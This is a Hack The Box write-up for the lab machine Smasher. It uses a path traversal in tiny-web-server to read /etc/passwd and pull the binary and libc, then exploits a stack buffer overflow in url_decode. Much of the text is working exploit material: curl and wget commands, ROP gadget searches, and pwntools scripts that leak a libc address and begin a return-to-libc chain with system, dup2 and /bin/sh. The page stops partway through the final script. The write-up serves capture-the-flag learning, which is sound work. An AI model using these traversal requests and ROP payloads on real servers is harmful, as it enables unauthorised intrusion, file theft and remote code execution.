.codehilite .na{color:teal}
.codehilite .nb{color:#0086b3}
.codehilite .nc{color:#445588;font-weight:bold}
.codehilite .no{color:teal}
.codehilite .ni{color:purple}
.codehilite .ne{color:#990000;font-weight:bold}
.codehilite .nf{color:#990000;font-weight:bold}
.codehilite .nn{color:#555555}
.codehilite .nt{color:navy}
.codehilite .nv{color:teal}
.codehilite .ow{font-weight:bold}
.codehilite .w{color:#bbbbbb}
.codehilite .mf{color:#009999}
.codehilite .mh{color:#009999}
.codehilite .mi{color:#009999}
.codehilite .mo{color:#009999}
.codehilite .sb{color:#dd1144}
.codehilite .sc{color:#dd1144}
.codehilite .sd{color:#dd1144}
.codehilite .s2{color:#dd1144}
.codehilite .se{color:#dd1144}
.codehilite .sh{color:#dd1144}
.codehilite .si{color:#dd1144}
.codehilite .sx{color:#dd1144}
.codehilite .sr{color:#009926}
.codehilite .s1{color:#dd1144}
.codehilite .ss{color:#990073}
.codehilite .bp{color:#999999}
.codehilite .vc{color:teal}
.codehilite .vg{color:teal}
.codehilite .vi{color:teal}
.codehilite .il{color:#009999}
.codehilite .gc{color:#999;background-color:#EAF2F5}
</style><title>Notes</title></head><body><article class="markdown-body"><h1 id="hack-the-box-smasher-10101089">Hack the Box, Smasher - 10.10.10.89<a class="headerlink" href="#hack-the-box-smasher-10101089" title="Permanent link"></a></h1>
<h2 id="scan">Scan<a class="headerlink" href="#scan" title="Permanent link"></a></h2>
<p>When performing a quick port scan, we find ports 22 and 1111 are open.
<div class="codehilite"><pre><span class="nv">$ </span>nmap -T5 -p- 10.10.10.89
Nmap scan report <span class="k">for</span> 10.10.10.89
Host is up.
Not shown: <span class="m">63245</span> closed ports, <span class="m">2288</span> filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
1111/tcp open  lmsocialserver
</pre></div></p>
<p>By banner grabbing port 1111 we find it&rsquo;s <code>shenfeng tiny-web-server</code>.
<div class="codehilite"><pre><span class="nv">$ </span>curl -I 10.10.10.89:1111
HTTP/1.1 <span class="m">200</span> OK
Server: shenfeng tiny-web-server
Content-Type: text/html
</pre></div></p>
<p>A quick web search gives us <a href="https://github.com/shenfeng/tiny-web-server">https://github.com/shenfeng/tiny-web-server</a>. When inspecting the repository, we quickly find an issue that allows us to read outside of the <code>wwwroot</code><sup>1</sup>.</p>
<p>So, apparently we can do this:
<div class="codehilite"><pre><span class="nv">$ </span>curl 10.10.10.89:1111//etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
www:x:1000:1000:www,,,:/home/www:/bin/bash
smasher:x:1001:1001:,,,:/home/smasher:/bin/bash
</pre></div></p>
<p>Besides that, we also find the following interesting lines of code:
<div class="codehilite"><pre><span class="c1">// tiny-web-server/tiny.c</span>

<span class="c1">// line 19</span>
<span class="cp">#define MAXLINE 1024   </span><span class="cm">/* max length of a line */</span><span class="cp"></span>

<span class="c1">// lines 32-36</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="kt">off_t</span> <span class="n">offset</span><span class="p">;</span>              <span class="cm">/* for support Range */</span>
    <span class="kt">size_t</span> <span class="n">end</span><span class="p">;</span>
<span class="p">}</span> <span class="n">http_request</span><span class="p">;</span>

<span class="c1">// lines 250 - 299</span>
<span class="kt">void</span> <span class="nf">url_decode</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">src</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dest</span><span class="p">,</span> <span class="kt">int</span> <span class="n">max</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">src</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">code</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">p</span> <span class="o">&amp;&amp;</span> <span class="o">--</span><span class="n">max</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">p</span> <span class="o">==</span> <span class="sc">&#39;%&#39;</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">memcpy</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="o">++</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
            <span class="o">*</span><span class="n">dest</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">strtoul</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
            <span class="n">p</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="o">*</span><span class="n">dest</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">p</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="o">*</span><span class="n">dest</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">parse_request</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">http_request</span> <span class="o">*</span><span class="n">req</span><span class="p">){</span>
    <span class="kt">rio_t</span> <span class="n">rio</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">MAXLINE</span><span class="p">],</span> <span class="n">method</span><span class="p">[</span><span class="n">MAXLINE</span><span class="p">],</span> <span class="n">uri</span><span class="p">[</span><span class="n">MAXLINE</span><span class="p">];</span>
    <span class="n">req</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">req</span><span class="o">-&gt;</span><span class="n">end</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>              <span class="cm">/* default */</span>

    <span class="n">rio_readinitb</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rio</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
    <span class="n">rio_readlineb</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rio</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">MAXLINE</span><span class="p">);</span>
    <span class="n">sscanf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;%s %s&quot;</span><span class="p">,</span> <span class="n">method</span><span class="p">,</span> <span class="n">uri</span><span class="p">);</span> <span class="cm">/* version is not cared */</span>
    <span class="cm">/* read all */</span>
    <span class="k">while</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* \n || \r\n */</span>
        <span class="n">rio_readlineb</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rio</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">MAXLINE</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;R&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;a&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;n&#39;</span><span class="p">){</span>
            <span class="n">sscanf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;Range: bytes=%lu-%lu&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">end</span><span class="p">);</span>
            <span class="c1">// Range: [start, end]</span>
            <span class="k">if</span><span class="p">(</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">end</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">end</span> <span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">filename</span> <span class="o">=</span> <span class="n">uri</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">uri</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;/&#39;</span><span class="p">){</span>
        <span class="n">filename</span> <span class="o">=</span> <span class="n">uri</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
            <span class="n">filename</span> <span class="o">=</span> <span class="s">&quot;.&quot;</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="o">++</span> <span class="n">i</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;?&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">url_decode</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">,</span> <span class="n">MAXLINE</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
Here, we can see that <code>filename</code> (or <code>uri[MAXLINE]</code>) is URL-decoded and copied into <code>req-&gt;filename</code>. However, <code>MAXLINE</code> is defined as 1024 even though the size of <code>http_request-&gt;filename</code> is equal to 512. We&rsquo;ll use this buffer overflow to create an exploit.</p>
<p>Let&rsquo;s use the path traversal to download the binary.
<div class="codehilite"><pre><span class="nv">$ </span>wget http://10.10.10.89:1111//home/www/tiny-web-server/tiny -O tiny
<span class="nv">$ </span>./tiny
listen on port 9999, fd is 3
^C
</pre></div></p>
<p>Check it&rsquo;s properties.
<div class="codehilite"><pre><span class="nv">$ </span>checksec tiny
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/tmp/data/tiny&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
    RWX:      Has RWX segments
    FORTIFY:  Enabled
</pre></div></p>
<p>Ok, so this is where we chose the hard way (there is an easier way, which I might work out some day). We will try to leak an address of a function that falls in LIBC. We do this by making a call to <code>write</code> with the address we want to leak. For this we need the address of <code>write</code> in PLT (which we will call) and GOT (which we will use to leak the LIBC address).
<div class="codehilite"><pre>$ objdump -d tiny | grep write
0000000000400c50 &lt;write@plt&gt;:
  400c50:   ff 25 e2 23 20 00       jmpq   *0x2023e2(%rip)        # 603038 &lt;write@GLIBC_2.2.5&gt;
$ objdump -R tiny | grep write
0000000000603038 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5
</pre></div></p>
<p>Furthermore, we need to set <code>rdi</code>, <code>rsi</code> and <code>rdx</code><sup>2</sup>, which will be the arguments for <code>write(fd, void *buf, count)</code> (in that respective order).</p>
<div class="codehilite"><pre><span class="nv">$ </span>ropper -f tiny <span class="p">|</span> grep rdi
<span class="o">[</span>...<span class="o">]</span>
0x00000000004011dd: pop rdi<span class="p">;</span> ret<span class="p">;</span>
<span class="o">[</span>...<span class="o">]</span>

<span class="nv">$ </span>ropper -f tiny <span class="p">|</span> grep rsi
<span class="o">[</span>...<span class="o">]</span>
0x00000000004011db: pop rsi<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span>
<span class="o">[</span>...<span class="o">]</span>
</pre></div>

<p>Unfortunately, there is no <code>pop rdx;</code> in the binary, which is the number of bytes we would like to write to our file descriptor.
<div class="codehilite"><pre><span class="nv">$ </span>ropper -f tiny <span class="p">|</span> grep rdx
<span class="o">[</span>INFO<span class="o">]</span> Load gadgets from cache
<span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
<span class="o">[</span>LOAD<span class="o">]</span> removing double gadgets... 100%
0x00000000004026b7: add byte ptr <span class="o">[</span>rax + rax<span class="o">]</span>, dh<span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al<span class="p">;</span> sub al, 2<span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al<span class="p">;</span> sal dl, 0xff<span class="p">;</span> jmp qword ptr <span class="o">[</span>rdx<span class="o">]</span><span class="p">;</span>
0x00000000004026b9: add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al<span class="p">;</span> add byte ptr <span class="o">[</span>rdx + rax<span class="o">]</span>, ch<span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al<span class="p">;</span> sal dl, 0xff<span class="p">;</span> jmp qword ptr <span class="o">[</span>rdx<span class="o">]</span><span class="p">;</span>
0x00000000004026be: add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al<span class="p">;</span> sal dl, 0xff<span class="p">;</span> jmp qword ptr <span class="o">[</span>rdx<span class="o">]</span><span class="p">;</span>
0x00000000004026ba: add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al<span class="p">;</span> sub al, 2<span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al<span class="p">;</span> sal dl, 0xff<span class="p">;</span> jmp qword ptr <span class="o">[</span>rdx<span class="o">]</span><span class="p">;</span>
0x00000000004026bb: add byte ptr <span class="o">[</span>rdx + rax<span class="o">]</span>, ch<span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al<span class="p">;</span> sal dl, 0xff<span class="p">;</span> jmp qword ptr <span class="o">[</span>rdx<span class="o">]</span><span class="p">;</span>
0x00000000004024db: call qword ptr <span class="o">[</span>rdx<span class="o">]</span><span class="p">;</span>
0x00000000004026c3: jmp qword ptr <span class="o">[</span>rdx<span class="o">]</span><span class="p">;</span>
0x0000000000402543: jmp rdx<span class="p">;</span>
0x0000000000401780: mov byte ptr <span class="o">[</span>rdx<span class="o">]</span>, 0<span class="p">;</span> add rsp, 0x10<span class="p">;</span> pop rbx<span class="p">;</span> pop rbp<span class="p">;</span> pop r12<span class="p">;</span> ret<span class="p">;</span>
0x0000000000401302: push rdx<span class="p">;</span> mov word ptr <span class="o">[</span>rdi + 4<span class="o">]</span>, ax<span class="p">;</span> ret<span class="p">;</span>
0x00000000004026c0: sal dl, 0xff<span class="p">;</span> jmp qword ptr <span class="o">[</span>rdx<span class="o">]</span><span class="p">;</span>
0x00000000004026bc: sub al, 2<span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al<span class="p">;</span> sal dl, 0xff<span class="p">;</span> jmp qword ptr <span class="o">[</span>rdx<span class="o">]</span><span class="p">;</span>
0x00000000004026b8: xor al, 0<span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al<span class="p">;</span> sub al, 2<span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al<span class="p">;</span> sal dl, 0xff<span class="p">;</span> jmp qword ptr <span class="o">[</span>rdx<span class="o">]</span><span class="p">;</span>
</pre></div></p>
<p>But, fortunately, if we run the program in GDB with a breakpoint at the return of <code>url_decode</code> (0x0x40178b), we see that <code>rdx</code> is a non-zero value:
<div class="codehilite"><pre> RDX  0x7fffffffe5de ◂— 0x400fa02700
</pre></div></p>
<p>The box wasn&rsquo;t very responsive when building this exploit, therefore we keep retrying, with a short timeout set, until we receive a response. Some resources used are referenced below<sup>3, 4, 5</sup>.</p>
<div class="codehilite"><pre><span class="ch">#!/bin/python</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">connect</span><span class="p">,</span> <span class="n">cyclic_find</span><span class="p">,</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">urlencode</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">context</span><span class="p">,</span> <span class="n">log</span>


<span class="k">class</span> <span class="nc">Exploit</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="n">timeout</span>

        <span class="c1"># hardcoded values</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">file_not_found</span> <span class="o">=</span> <span class="s">&#39;File not found&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">command</span> <span class="o">=</span> <span class="s">&#39;GET&#39;</span>

        <span class="c1"># PIE disabled</span>
        <span class="c1"># since PIE is disabled, we can use the exact addresses from ropper</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4011dd</span>  <span class="c1"># 0x4011dd: pop rdi; ret;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">pop_rsi_pop_r15</span> <span class="o">=</span> <span class="mh">0x4011db</span>  <span class="c1"># 0x4011db: pop rsi; pop r15; ret;</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">write_plt</span> <span class="o">=</span> <span class="mh">0x400c50</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write_got</span> <span class="o">=</span> <span class="mh">0x603038</span>

        <span class="c1"># manually found</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="s">&#39;vaaaaaac&#39;</span><span class="p">,</span> <span class="n">n</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">__leak</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">fun_got</span><span class="p">):</span>
        <span class="c1"># only encode url-unsafe characters to make sure that we still overflow</span>
        <span class="c1"># the buffer. An encoded character takes 3 spaces in the url buffer, but</span>
        <span class="c1"># only 1 space in the filename buffer.</span>
        <span class="n">nop_sled</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x90</span><span class="s">&#39;</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">offset</span>

        <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">nop_sled</span>

        <span class="c1"># rop chain</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pop_rsi_pop_r15</span><span class="p">))</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">fun_got</span><span class="p">))</span>         <span class="c1"># address of libc function we want to leak</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xb5</span><span class="p">))</span>            <span class="c1"># bs filler</span>

        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pop_rdi</span><span class="p">))</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">fd</span><span class="p">))</span>         <span class="c1"># fd we want to write to</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">write_plt</span><span class="p">))</span>    <span class="c1"># function we want to call</span>

        <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">&#39;warn&#39;</span>

        <span class="c1"># keep trying until we receive a response.</span>
        <span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
        <span class="k">while</span> <span class="n">output</span> <span class="o">==</span> <span class="s">&#39;&#39;</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">ip</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">command</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="p">)</span>

            <span class="k">try</span><span class="p">:</span>
                <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">file_not_found</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">timeout</span><span class="p">)</span>
                <span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">timeout</span><span class="p">)</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="n">log</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s">&#39;Leak not found, retrying.&#39;</span><span class="p">)</span>

            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

        <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">&#39;info&#39;</span>
        <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">output</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>

    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;Start leaking address.&#39;</span><span class="p">)</span>
        <span class="n">write_libc</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__leak</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">write_got</span><span class="p">)</span>


<span class="n">Exploit</span><span class="p">(</span><span class="s">&#39;10.10.10.89&#39;</span><span class="p">,</span> <span class="mi">1111</span><span class="p">)</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</pre></div>

<p>Now, we want to use this address to create a return-to-libc attack. And since we have a path traversal on the machine, we use that to download the libc from the machine and extract the needed addresses from it.
<div class="codehilite"><pre><span class="nv">$ </span>wget 10.10.10.89:1111//lib/x86_64-linux-gnu/libc-2.23.so
<span class="nv">$ </span>readelf -s libc-2.23.so <span class="p">|</span> grep write
<span class="o">[</span>...<span class="o">]</span>
   169: 00000000000f72b0    <span class="m">90</span> FUNC    WEAK   DEFAULT   <span class="m">13</span> __write@@GLIBC_2.2.5
<span class="o">[</span>...<span class="o">]</span>
  2159: 00000000000f72b0    <span class="m">90</span> FUNC    WEAK   DEFAULT   <span class="m">13</span> write@@GLIBC_2.2.5
<span class="nv">$ </span>readelf -s libc-2.23.so <span class="p">|</span> grep system
<span class="o">[</span>...<span class="o">]</span>
   584: <span class="m">0000000000045390</span>    <span class="m">45</span> FUNC    GLOBAL DEFAULT   <span class="m">13</span> __libc_system@@GLIBC_PRIVATE
  1351: <span class="m">0000000000045390</span>    <span class="m">45</span> FUNC    WEAK   DEFAULT   <span class="m">13</span> system@@GLIBC_2.2.5
<span class="nv">$ </span>readelf -s libc-2.23.so <span class="p">|</span> grep dup2
   592: 00000000000f7970    <span class="m">33</span> FUNC    GLOBAL DEFAULT   <span class="m">13</span> __dup2@@GLIBC_2.2.5
   962: 00000000000f7970    <span class="m">33</span> FUNC    WEAK   DEFAULT   <span class="m">13</span> dup2@@GLIBC_2.2.5
<span class="nv">$ </span>strings -a -t x libc-2.23.so <span class="p">|</span> grep /bin/sh
 18cd57 /bin/sh
</pre></div></p>
<p>We use these to create our final exploit:
<div class="codehilite"><pre><span class="ch">#!/bin/python</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">connect</span><span class="p">,</span> <span class="n">cyclic_find</span><span class="p">,</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">urlencode</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">context</span><span class="p">,</span> <span class="n">log</span>


<span class="k">class</span> <span class="nc">Exploit</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="n">timeout</span>

        <span class="c1"># hardcoded values</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">file_not_found</span> <span class="o">=</span> <span class="s">&#39;File not found&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">command</span> <span class="o">=</span> <span class="s">&#39;GET&#39;</span>

        <span class="c1"># PIE disabled</span>
        <span class="c1"># since PIE is disabled, we can use the exact addresses from ropper</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4011dd</span>  <span class="c1"># 0x4011dd: pop rdi; ret;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">pop_rsi_pop_r15</span> <span class="o">=</span> <span class="mh">0x4011db</span>  <span class="c1"># 0x4011db: pop rsi; pop r15; ret;</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">write_got</span> <span class="o">=</span> <span class="mh">0x603038</span>

        <span class="c1"># libc offsets</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write_offset</span> <span class="o">=</span> <span class="mh">0xf72b0</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">system_offset</span> <span class="o">=</span> <span class="mh">0x45390</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">dup2_offset</span> <span class="o">=</span> <span class="mh">0xf7970</span>
